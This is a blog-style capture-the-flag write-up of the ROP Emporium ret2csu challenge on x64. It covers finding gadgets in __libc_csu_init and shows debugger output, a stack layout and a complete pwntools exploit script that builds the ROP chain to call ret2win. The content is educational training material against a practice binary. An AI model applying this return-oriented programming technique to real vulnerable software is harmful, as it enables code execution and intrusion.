---
title: ROP x64 Challenge 8
layout: page
permalink: /ROP_emporium/ROP-x64-Challenge-8
status: page
type: page
published: true
comments: true
date: 2022-07-13
---
## Challenge 8

And we've reached the end of the road with these challenges and have just one more to do. The task is pretty simple, like before there is a ret2win function in the attached library and we have to call it with specific arguments, `ret2win(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)` to be exact. 

So we remember the registers for arguments go rdi, rsi, and rdx for 1st, 2nd, and 3rd arguments to a function respectively. 

Opening up the binary, we can see that the ret2win function is in the plt, so we don't have to worry about getting offsets to it or anything.

```
pwndbg> plt
0x400500: pwnme@plt
0x400510: ret2win@plt
```

We also see that we can easily control rsi and rdi.

```
pwndbg> ropper -- --search "pop rdi"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rdi

[INFO] File: /root/working/ret2csu/ret2csu_64/ret2csu
0x00000000004006a3: pop rdi; ret; 

pwndbg> ropper -- --search "pop rsi"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rsi

[INFO] File: /root/working/ret2csu/ret2csu_64/ret2csu
0x00000000004006a1: pop rsi; pop r15; ret; 
```

However, we can not find any gadgets that affect rdx in the binary. I spent a lot of time here trying to figure this out and got no where, so I ended up reading the paper linked in the challenge: [BlackHat Asia paper](https://i.blackhat.com/briefings/asia/2018/asia-18-Marco-return-to-csu-a-new-method-to-bypass-the-64-bit-Linux-ASLR-wp.pdf) and [this article](https://www.voidsecurity.in/2013/07/some-gadget-sequence-for-x8664-rop.html) by voidsecurity. 

The idea is that automatid tools like ropper don't find every possible gadget and if you know what you are doing you can find gadgets in the boiler plate code that gcc adds to every binary. If you can find useful gadgets in the boilerplate, those gadgets should be in every binary and hence universal.

The boilerplate code we are using for this challenge is the \_\_libc_csu_init function. Which is as follows:

```
   0x0000000000400640 <+0>:     push   r15
   0x0000000000400642 <+2>:     push   r14
   0x0000000000400644 <+4>:     mov    r15,rdx
   0x0000000000400647 <+7>:     push   r13
   0x0000000000400649 <+9>:     push   r12
   0x000000000040064b <+11>:    lea    r12,[rip+0x20079e]        # 0x600df0
   0x0000000000400652 <+18>:    push   rbp
   0x0000000000400653 <+19>:    lea    rbp,[rip+0x20079e]        # 0x600df8
   0x000000000040065a <+26>:    push   rbx
   0x000000000040065b <+27>:    mov    r13d,edi
   0x000000000040065e <+30>:    mov    r14,rsi
   0x0000000000400661 <+33>:    sub    rbp,r12
   0x0000000000400664 <+36>:    sub    rsp,0x8
   0x0000000000400668 <+40>:    sar    rbp,0x3
   0x000000000040066c <+44>:    call   0x4004d0 <_init>
   0x0000000000400671 <+49>:    test   rbp,rbp
   0x0000000000400674 <+52>:    je     0x400696 <__libc_csu_init+86>
   0x0000000000400676 <+54>:    xor    ebx,ebx
   0x0000000000400678 <+56>:    nop    DWORD PTR [rax+rax*1+0x0]
   0x0000000000400680 <+64>:    mov    rdx,r15
   0x0000000000400683 <+67>:    mov    rsi,r14
   0x0000000000400686 <+70>:    mov    edi,r13d
   0x0000000000400689 <+73>:    call   QWORD PTR [r12+rbx*8]
   0x000000000040068d <+77>:    add    rbx,0x1
   0x0000000000400691 <+81>:    cmp    rbp,rbx
   0x0000000000400694 <+84>:    jne    0x400680 <__libc_csu_init+64>
   0x0000000000400696 <+86>:    add    rsp,0x8
   0x000000000040069a <+90>:    pop    rbx
   0x000000000040069b <+91>:    pop    rbp
   0x000000000040069c <+92>:    pop    r12
   0x000000000040069e <+94>:    pop    r13
   0x00000000004006a0 <+96>:    pop    r14
   0x00000000004006a2 <+98>:    pop    r15
   0x00000000004006a4 <+100>:   ret   
```


We see in this function that line 64 sets the rdx redgister to r15 and on line 98 we can control r15 with the pop instruction right before the ret. The problem is that on line 73, there is a relitive call to the function pointed to by \[r12+rbx\*8\]. Now we control r12 (see line 92) and rbp, however that call is double de refrenced. So the execution will continue to happen at \[r12+rbx\*8\] -> address -> start_of_call. So we have to find a do nothing function, which has a function pointer pointing to it somewhere in memory. 

So let's start up the program and break in gdb right before our exploit starts and see if we can find any function pointers to use. In the second article I referenced, I noticed this line, "In \_DYNAMIC variable ie. .dynamic section of executable we can find pointers to \_init and \_fini section." So let's print off the values in dynamic right now.


```
pwndbg> x/30gx &_DYNAMIC 
...
0x600e30:       0x000000000000000c      0x00000000004004d0
0x600e40:       0x000000000000000d      0x00000000004006b4
0x600e50:       0x0000000000000019      0x0000000000600df0
...
```

A couple of those values look familarish. The 400 values are the range of the plt (which we can call, so pointers to functions) and the 600 is around the got (which are pointers to functions). So now we just got to figure out which functions these are.

looking at 0x4004d0 we see
```
pwndbg> tele 0x4006b4 20
00:0000│  0x4006b4 (_fini) ◂— sub    rsp, 8
01:0008│  0x4006bc (_fini+8) ◂— ret    
```
which is basically a do nothing functions which we can call. So if we look at the rest of the function all we have to do is get past the jne on line 84 which is easy enough because we have control over all the registers used in the compare.

   0x0000000000400691 <+81>:    cmp    rbp,rbx
   0x0000000000400694 <+84>:    jne    0x400680 <\_\_libc_csu_init+64>

So now we have everything we need to make the payload.

Note, I'll be using gadgets from the csu init function with just gadget $line_num for notation

```
         | stack          |
         | -------------- | 
32 bytes | start buffer   |
8  bytes | base pointer   | # fill the buffer and base pointer
8  bytes | gadget 90      | # pop everything off rbx, rbp, r12-15      
8  bytes | 0x1            | # rbx value                                         
8  bytes | 0x2            | # rbp value must be 1 more then rbx for the cmp and jump               
8  bytes | addr in dynm   | # r12 the address in dynamic pointing to func pointer to csu_fini
8  bytes | 0xdeadbeef...  | # r13 mapped to edi                                   
8  bytes | 0xcafebabe...  | # r14 mapped to rsi                               
8  bytes | 0xd00df00d     | # r15 mapped to rdx                       
8  bytes | gadget 64      | # the gadget for placing rdx and going through the call
8  bytes | random junk    | # stack pointer is add/sub to 
8  bytes | 0x1            | # we have to redo all the pops to finish out the function
8  bytes | 0x2            |                
8  bytes | addr in dynm   | 
8  bytes | 0xdeadbeef...  |                                   
8  bytes | 0xcafebabe...  |                                
8  bytes | 0xd00df00d     |                       
8  bytes | pop rdi        | # replace the changed rdi value
8  bytes | 0xdeadbeef...  | 
8  bytes | ret2win        | # all values have been placed so we can call ret2win
8  bytes | -------------- |

```


```Python
#!/usr/bin/python3

from pwn import *


write_loc 	= 0x601029
print_file 	= p64(0x400620)
target		= "./ret2csu"
back_junk 	= b"B" * 20
# The amount to fill the buffer
junk = b'A' * 0x20

# The 8 bytes to fill the new base pointer from the leave
new_bp = p32(0xc0deba5e)*2


"""
Place a string (1st arg) into the location
given by the 2nd arg. Note the 2nd arg should be 
packed
"""
import binascii
def print_payload(payload):
	for i in range(0, len(payload), 8):
		continue
		print(binascii.hexlify(payload[i:i+8]))

io = process(target)
first_out = io.clean(0.5).decode("utf-8")
print(first_out)
payload = junk + new_bp
payload += p64(0x0040069a)		# pop everything
payload += p64(0x1)			# rbx val *8 for call
payload += p64(0x2)			# rbp must be 1 more then rbx
payload += p64(0x600e48-8)		# Base of the call, do nothing ptr in dynamic
payload += p64(0xdeadbeefdeadbeef)	# edi through r13
payload += p64(0xcafebabecafebabe)	# rsi through r14
payload += p64(0xd00df00dd00df00d)	# rdx through r15
payload += p64(0x0400680)		# ret call to ptr call


payload += p64(0x0123456789abcdef)	# random junk skipped over
# we have to go through all of the pops again from gaget 1

payload += p64(0x1)			# rbx val *8 for call
payload += p64(0x2)			# rbp must be 1 more then rbx
payload += p64(0x600e48-8)		# Base of the call, do nothing ptr in dynamic
payload += p64(0xdeadbeefdeadbeef)	# edi through r13
payload += p64(0xcafebabecafebabe)	# rsi through r14
payload += p64(0xd00df00dd00df00d)	# rdx through r15


payload += p64(0x04006a3)		# pop edi address
payload += p64(0xdeadbeefdeadbeef)	# edi value

payload += p64(0x400510)		# the ret2win addr

# print("The payload is:")
# print(payload)
print("Payload size is:" + str(len(payload)))

input("Hit enter to apptempt exploit")



print(io.clean(0.5).decode("utf-8"))

input("exploit sent hit enter to end")
io.send(payload)


print(io.clean(0.5).decode("utf-8"))


sleep(1)


f = open('./payload', 'wb')
f.write(payload)
f.close()

```
